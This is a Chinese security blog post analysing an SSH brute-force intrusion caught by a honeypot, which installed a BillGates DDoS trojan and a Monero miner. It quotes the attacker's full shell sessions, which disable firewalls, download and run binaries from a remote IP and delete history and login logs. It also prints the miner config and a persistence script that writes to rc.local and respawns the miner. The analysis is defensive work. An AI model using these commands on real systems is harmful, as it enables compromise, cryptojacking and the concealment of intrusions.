## 前言

 **虚拟货币自诞生以来，就与黑产有着说不清道不明的关系，从一开始充当地下交易的介质，到成为逃避追踪的勒索病毒的钱包，利益之所向，必是黑产之跟随。**

随着虚拟货币在市场中的价格节节攀升，越来越多的黑产也不满足于使用虚拟货币，转而投身于挖矿的大军中去。

当然，黑产们本身并不具备生产虚拟货币的必要条件，所以他们动起了肉鸡挖矿的心思，虽然服务器质量层次不齐，但聚沙成塔，积少成多，矿池的出现更是大大方便了黑产们挖矿的脚步。

## 起

最近，安恒威胁情报小组在蜜罐系统中发现黑产挖矿的踪迹。黑产dalao，我一个搞网络安全的，你挖矿挖我这儿来了，是不是有点儿飘？要battle吗？

![timg.png](https://image.3001.net/images/20181127/1543287422_5bfcb27e8a0b3.png!small)

某日，黑产的自动爆破脚本费劲了千辛万苦，终于成功突破了蜜罐(程序猿小哥钓鱼中...)。按照惯例，黑产们喜欢先查看一下机器的配置和性能。

> cat /proc/cpuinfo
>
> free –m

24核48线程的cpu和高达128G的内存，一定会让他激动不已（程序猿小哥持续钓鱼...）

先来一套关闭防火墙连招，iptabeles和SuSEfirewall通通关掉。

> /etc/init.d/iptables stop
>
> service iptables stop
>
> SuSEfirewall2 stop
>
> reSuSEfirewall2 stop

接下来上wget，下载文件并执行，清除历史记录（可惜被我们蜜罐记录的清清楚楚）。

> chattr -i /usr/bin/wget
>
> chmod 755 /usr/bin/wget
>
> yum install -y wget
>
> pkill sysxlv
>
> rm -f /etc/sysxlv
>
> rm -f /etc/sysxlv.1
>
> wget -c -P /etc/ <http://111.73.45.73:9789/sysxlv>
>
> chmod 755 /etc/sysxlv
>
> nohup /etc/sysxlv > /dev/null 2>&1 &
>
> export HISTFILE=/dev/null
>
> rm -f /var/log/wtmp
>
> history –c
>
> exit

从上面我们可以猜测，之前还有一个编译的版本是sysxlv.1，所以在启动前要查找并删除这个版本。

![111.jpg](https://image.3001.net/images/20181127/1543287457_5bfcb2a18b294.jpg!small)

来，让我们一起走进信息安全，看看这个黑产dalao究竟要在服务器上做了些什么。

##  **承**

sysxlv看起来像是一个可执行程序，查看一下基本信息：

![1.jpg](https://image.3001.net/images/20181127/1543287480_5bfcb2b8536dc.jpg!small)

确实是一个elf32的可执行程序，看样子也没有加壳，那就直接上反汇编利器IDA Pro。

![2.png](https://image.3001.net/images/20181127/1543287486_5bfcb2be74915.png!small)

看这架势像是江湖上大名鼎鼎的BillGates木马家族，该家族的木马，兼修windows和Linux两大平台，功能齐全，操作简单，攻击者可以选取TCP-SYN Flood、UDP Flood、CC攻击、DNS放大等多种攻击方式对目标发起攻击。

简单看看这款木马的功能和结构。

### 1.自校验和反调试

首先木马会.rodata段中解密配置信息，获取文件大小，与自身进行比较，并检查进程中是否存在gdb，以达到反调试的效果。

![3.png](https://image.3001.net/images/20181127/1543287502_5bfcb2ce1f43d.png!small)

### 2.CheckGatesType

该函数中，木马会对路径进行判断，通过给出的不同的返回值，木马会采取不同的启动方式。下表是不同返回值对应的不同条件。

![112.jpg](https://image.3001.net/images/20181127/1543287520_5bfcb2e05a08f.jpg!small)

### 3.MainBeikong

最常见的安装方式为mainbeikong，即默认情况。该函数主要实现了一下几个功能。
首先调用daemon()去fork一个新进程，而父进程会调用exit(0)退出，这样通过ps-a 无法发现启动进程。

![4.jpg](https://image.3001.net/images/20181127/1543287534_5bfcb2ee7099b.jpg!small)

接着，会检测是否存在之前安装程序，如果存在文件就将其删除，并添加自启动（setautostart）。 最后启动主进程MainProcess。

### 4.MainProces

![5.jpg](https://image.3001.net/images/20181127/1543287549_5bfcb2fd41643.jpg!small)

主进程主要进行了以下操作：

执行挂起，时间为0x7d0（2000ms），删除升级临时文件，从/etc/resolv.conf读取dns缓存信息，从conf.n读取配置信息，从cmd.n读取正在执行的情况，获取程序运行情况。

初始化CManager，挂起等待C2指令并执行。

![6.jpg](https://image.3001.net/images/20181127/1543287557_5bfcb30588b3a.jpg!small)

### 5.数据解密

从静态分析来看，木马没有直接将返回地址写在程序中，而是通过程序解密得到的。下面用edb工具简单的进行了动态调试。

在ida中发现一段疑似加密的字符串：

![7.png](https://image.3001.net/images/20181127/1543287572_5bfcb3148b476.png!small)

通过函数名，将断点定位到该函数的起始点：

![8.png](https://image.3001.net/images/20181127/1543287585_5bfcb321595c3.png!small)

程序跑到0x08130830这个函数里，把之前的字符串导了进来：

![9.png](https://image.3001.net/images/20181127/1543287590_5bfcb32655b62.png!small)

经过解密后我们得到了返回地址：

![10.png](https://image.3001.net/images/20181127/1543287599_5bfcb32f0eb4d.png!small)

## 转

从上面的分析来看，这可能是一个抓鸡的小黑产，用的也是主流的ddos木马。

但是当我们翻开当天的蜜罐日志发现，事情远不止那么简单。

就在他放完木马运行并断开连接的三分钟后，黑产再次通过爆破的方式进入到了系统中。

    
    
    /etc/init.d/iptables stop
    
    service iptables stop
    
    SuSEfirewall2 stop
    
    reSuSEfirewall2 stop
    
    chattr -i /usr/bin/wget
    
    chmod 755 /usr/bin/wget
    
    yum install -y wget
    
    pkill sysxlv
    
    rm -f /etc/sysxlv
    
    wget -c -P /etc/ <http://111.73.45.73:9789/sysxlj>
    
    wget -c -P /etc/ <http://111.73.45.73:9789/config.json>
    
    chmod 755 /etc/sysxlj
    
    nohup /etc/sysxlj > /dev/null 2>&1 &
    
    wget -c -P /etc/ <http://111.73.45.73:9789/jourxlv>
    
    chmod 755 /etc/jourxlv
    
    nohup /etc/jourxlv > /dev/null 2>&1 &
    
    export HISTFILE=/dev/null
    
    rm -f /var/log/wtmp
    
    history –c
    
    exit

还是熟悉的套路，不同的是这一次放了三个文件，下面是文件对应的hash值。

![113.jpg](https://image.3001.net/images/20181127/1543287872_5bfcb44092fa1.jpg!small)

非常遗憾的是蜜罐由于网络原因未能捕获到sysxlj文件，不过下面我们通过分析，来推测一下，这个黑产在我们蜜罐中还想做什么。  

先来看看config.json：

    
    
    {
    
        "algo":"cryptonight",
    
        "api":{
    
           "port":0,
    
           "access-token":null,
    
           "worker-id":null,
    
           "ipv6":false,
    
           "restricted":true
    
        },
    
        "av":0,
    
        "background":false,
    
        "colors":true,
    
        "cpu-affinity":null,
    
        "cpu-priority":null,
    
        "donate-level":1,
    
        "huge-pages":true,
    
        "hw-aes":null,
    
        "log-file":null,
    
        "max-cpu-usage":75,
    
        "pools":[
    
           {
    
               "url":"mine.ppxxmr.com:3333",
    
        "user":"471Bu7QT79ufDEqDSoKnV3V3aycs5oohTgW5ZTuamAifPBM4M91my5gX9cpp9jGDgcCAuRTtwVKD6hsDAsY7AU19HWjrsbJ",
    
               "pass":"x",
    
               "rig-id":null,
    
               "nicehash":false,
    
               "keepalive":false,
    
               "variant":1
    
           }
    
        ],
    
        "print-time":60,
    
        "retries":5,
    
        "retry-pause":5,
    
        "safe":false,
    
        "threads":null,
    
        "user-agent":null,
    
        "watch":false
    
    }

这是一个门罗币挖矿的配置信息。

矿池为：mine.ppxxmr.com:3333

钱包地址：

    
    
    471Bu7QT79ufDEqDSoKnV3V3aycs5oohTgW5ZTuamAifPBM4M91my5gX9cpp9jGDgcCAuRTtwVKD6hsDAsY7AU19HWjrsbJ

通过我们的数据大脑，还能知道，这个矿池与很多恶意样本都有过通信：

![13.jpg](https://image.3001.net/images/20181127/1543287679_5bfcb37fbcaab.jpg!small)

再来看一下jourxlv这个shell脚本。

注释中提到了sysxlj，可能和作者有一定联系。

    
    
    #!/bin/bash
    
    #Welcome like-minded friends to come to exchange.
    
    #We are a group of people who have a dream.
    
    #                by:sysxlj
    
    #                2016-03-10

首先关闭了iptables，并写入rc.loacl实现开机启动,并将sysxlj和本身备份到了/usr/bin下更改了名字。

    
    
    service iptables stop >/dev/null 2>&1&
    
    host_dir=`pwd`
    
    if[ "sh $host_dir/jourxlv &"="$(cat/etc/rc.local |grep$host_dir/jourxlv |grep-v grep)"]; then
    
       echo ""
    
    else
    
       echo "sh $host_dir/jourxlv &">>/etc/rc.local
    
    fi
    
    cpsysxlj /usr/bin/aher
    
    cpjourxlv /usr/bin/keudl

下面的作用应该是做了进程守护，如果发现本脚本以及sysxlj进程被结束，就从/usr/bin下拷贝回来，并重新运行。

    
    
    while[ 1 ]; do
    
        Centos_sshd_killn=$(psaux |grep"$host_dir/sysxlj"|grep-v grep |wc-l)
    
        if [[$Centos_sshd_killn-eq0]]; then
    
           if[ !-f"$host_dir/sysxlj"]; then
    
               if[ -f"/usr/bin/aher"]; then
    
                    cp/usr/bin/aher $host_dir/sysxlj
    
                    chmod755 ./sysxlj
    
               else
    
                    echo "No weeget"
    
               fi
    
           fi
    
           ./sysxlj &
    
        elif [[$Centos_sshd_killn-gt1]]; then
    
           forkilled in $(psaux |grep"$host_dir/sysxlj"|grep-v grep |awk'{print $2}');do
    
               Centos_sshd_killn=$(($Centos_sshd_killn-1))
    
               if [[$Centos_sshd_killn-eq1]]; then
    
                    continue
    
               else
    
                    kill -9 $killed
    
               fi
    
           done
    
        else
    
           echo ""
    
        fi

通过前面的分析我们可以知道，gates木马自身带有完善的开机自启，进程防杀的功能，所以虽然这个名为sysxlj的程序，和gates木马sysxlv很像，但是大概率不是同一个程序，外加我们还发现了挖矿的配置脚本，我们有理由推测，sysxlj这个程序应该是用来门罗币挖矿，而且，从配置来看，会大量占用服务器的cpu（75%）。

通过搜索sysxlj，我们在网上发现了这么一条消息：

![11.png](https://image.3001.net/images/20181127/1543287722_5bfcb3aaec3e0.png!small)

这也恰好应证了我们的猜想。

## 合

本来以为这是一个抓鸡放马的小黑产，没想到真正的目的是来利用我们服务器剩余资源来挖取门罗币。

下面来总结一下本次攻击的整个过程：

1.通过ssh爆破的方式，大规模扫描网段，尝试获取服务器shell；

2.进入机器后首先关闭iptables和SuSEfirewall防火墙；

3.使用wget从其本地的服务器下载ddos木马，修改权限并运行；

4.下载挖矿程序，配置信息，进程守护脚本，在后台利用服务器资源挖矿；

5.删除日志信息。

下面是有关本次入侵ip的信息：

![114.jpg](https://image.3001.net/images/20181127/1543287914_5bfcb46a5a2f4.jpg!small)

该ip来自江西上饶，被我们情报团队以及多个开源情报标记为恶意主机。

![12.jpg](https://image.3001.net/images/20181127/1543287764_5bfcb3d4e2497.jpg!small)

下面是有关本次入侵文件的信息：

![115.jpg](https://image.3001.net/images/20181127/1543287776_5bfcb3e0b702a.jpg!small)

防御的建议：

1.杜绝ssh弱口令，并且定期更换；

2.订购威胁情报，获取ssh爆破黑名单，一键屏蔽；

3.日志备份，定期查看是否存在大量占用系统资源的进程。

 ***本文作者：安恒风暴中心，转载请注明来自FreeBuf.COM**

